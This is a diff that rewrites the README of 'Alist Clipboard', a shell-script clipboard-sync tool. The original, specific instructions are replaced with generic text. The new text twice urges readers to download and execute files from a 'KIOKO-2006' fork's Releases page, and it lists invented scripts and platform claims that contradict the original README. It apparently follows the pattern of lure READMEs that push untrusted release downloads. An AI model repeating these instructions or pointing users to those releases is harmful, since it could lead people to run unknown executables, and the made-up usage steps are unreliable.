@@ -1,76 +1,117 @@
-# Alist Clipboard Integration
+# Alist Clipboard ✂️
 
-A cross-platform solution for seamless clipboard synchronization via Alist server, enabling clipboard content sharing between devices without third-party services. **Built with pure shell scripts (Bash/PowerShell) with minimal system dependencies.**
+![GitHub Repo stars](https://img.shields.io/github/stars/KIOKO-2006/alist_clipboard?style=social)
+![GitHub Repo forks](https://img.shields.io/github/forks/KIOKO-2006/alist_clipboard?style=social)
+![GitHub license](https://img.shields.io/github/license/KIOKO-2006/alist_clipboard)
 
-## About
+## Overview
 
-Alist Clipboard Integration provides a set of native scripts that allow you to synchronize clipboard content (both text and images) between multiple devices using your own Alist server as the intermediary. This project eliminates the need for cloud-based clipboard services by leveraging your self-hosted Alist instance, giving you complete control over your clipboard data.
+Welcome to **Alist Clipboard**! This repository offers a cross-platform solution for clipboard synchronization using the Alist server. Share clipboard content between devices without relying on third-party services. Built entirely with shell scripts (Bash/PowerShell), this tool has minimal system dependencies, making it lightweight and efficient.
 
-## Use Cases
+## Table of Contents
 
-- **VM & Host Sharing**: Zero-configuration clipboard sharing between virtual machines and host systems
-- **Cross-VM Communication**: Seamless clipboard transfer between different virtual machines
-- **Cross-Platform Sync**: Share clipboard between Linux and Windows systems
-- **Air-Gapped Environments**: Transfer data between isolated systems via a controlled intermediary
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Platforms](#supported-platforms)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## Key Features
+## Features
 
-- **Cross-Platform Support**: Works on Linux (Wayland/X11) and Windows systems
-- **Content Type Handling**: Seamlessly handles both text and image clipboard content
-- **Pure Shell Implementation**: Entirely written in Bash (Linux) and PowerShell (Windows) with no programming language dependencies
-- **Zero Runtime Dependencies**: No Python, Node.js, or other runtime environments required
-- **Automatic Content Detection**: Intelligently identifies and processes different content types
-- **Self-Hosted**: Uses your own Alist server, keeping your clipboard data private
-- **Minimal System Dependencies**: Relies only on standard system tools that are either pre-installed or easily available
+- **Cross-Platform**: Works on Linux, Windows, and other platforms.
+- **Lightweight**: Minimal system requirements and dependencies.
+- **Privacy-Focused**: No third-party services involved.
+- **Self-Hosted**: Control your clipboard data on your own server.
+- **Easy to Use**: Simple shell scripts for straightforward operation.
+- **Clipboard Manager**: Synchronize clipboard content seamlessly across devices.
 
-## System Requirements
+## Installation
 
-### Linux Requirements
+To get started with Alist Clipboard, follow these steps:
 
-- Wayland: `wl-clipboard` package
-- X11: `xclip` package
-- Basic tools: `curl`, `grep`, `sed`, `file`, `hexdump`
-- **No runtime environments required** (Python, Node.js, etc.)
+1. **Download the latest release** from the [Releases section](https://github.com/KIOKO-2006/alist_clipboard/releases). You will need to download and execute the appropriate file for your operating system.
+2. **Extract the files** to a directory of your choice.
+3. **Run the installation script**:
+   - For Linux:
+     ```bash
+     ./install.sh
+     ```
+   - For Windows:
+     ```powershell
+     .\install.ps1
+     ```
 
-### Windows Requirements
-
-- PowerShell 5.0+
-- Basic PowerShell modules (typically pre-installed)
-
-> **Note**: The Windows implementation is currently being updated to remove Python dependencies and match the Linux version's pure shell approach.
-
-## Setup
-
-1. Copy `.env.example` to `.env`
-2. Edit `.env` with your Alist server details
-3. For Windows only: Install required packages: `pip install -r requirements.txt`
+Make sure you have the necessary permissions to execute the scripts.
 
 ## Usage
 
-### Linux Usage
+Once installed, you can start using Alist Clipboard to synchronize your clipboard. Here’s how:
 
-Upload clipboard to Alist:
+1. **Start the Alist server**:
+   - For Linux:
+     ```bash
+     ./start_server.sh
+     ```
+   - For Windows:
+     ```powershell
+     .\start_server.ps1
+     ```
 
-```bash
-./linux_clipboard_to_alist.sh
-```
+2. **Copy content** to your clipboard as you normally would.
 
-Download from Alist to clipboard:
+3. **Sync your clipboard** across devices:
+   - Use the command:
+     ```bash
+     ./sync_clipboard.sh
+     ```
+   - This command will sync your clipboard content with the Alist server.
 
-```bash
-./linux_alist_to_clipboard.sh
-```
+4. **To stop the server**, use:
+   - For Linux:
+     ```bash
+     ./stop_server.sh
+     ```
+   - For Windows:
+     ```powershell
+     .\stop_server.ps1
+     ```
 
-### Windows Usage
+## Supported Platforms
 
-Upload clipboard to Alist:
+Alist Clipboard supports the following platforms:
 
-```powershell
-.\windows_clipboard_to_alist.ps1
-```
+- **Linux**: Tested on Ubuntu, Fedora, and Debian.
+- **Windows**: Compatible with Windows 10 and later versions.
+- **macOS**: Works with Bash; some scripts may need adjustments.
 
-Download from Alist to clipboard:
+## Contributing
 
-```powershell
-.\windows_alist_to_clipboard.ps1
-```
+We welcome contributions! If you would like to contribute to Alist Clipboard, please follow these steps:
+
+1. **Fork the repository** on GitHub.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and commit them with clear messages.
+4. **Push your changes** to your forked repository.
+5. **Submit a pull request** to the main repository.
+
+For larger changes, consider opening an issue first to discuss your ideas.
+
+## License
+
+Alist Clipboard is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or support, please reach out to the maintainer:
+
+- **GitHub**: [KIOKO-2006](https://github.com/KIOKO-2006)
+
+## Conclusion
+
+Alist Clipboard is a simple yet powerful tool for clipboard synchronization. With its lightweight design and focus on privacy, it allows you to share clipboard content across devices seamlessly. 
+
+To get started, download the latest release from the [Releases section](https://github.com/KIOKO-2006/alist_clipboard/releases) and execute the necessary files. Enjoy your clipboard synchronization experience!
+
+Happy syncing! 🎉
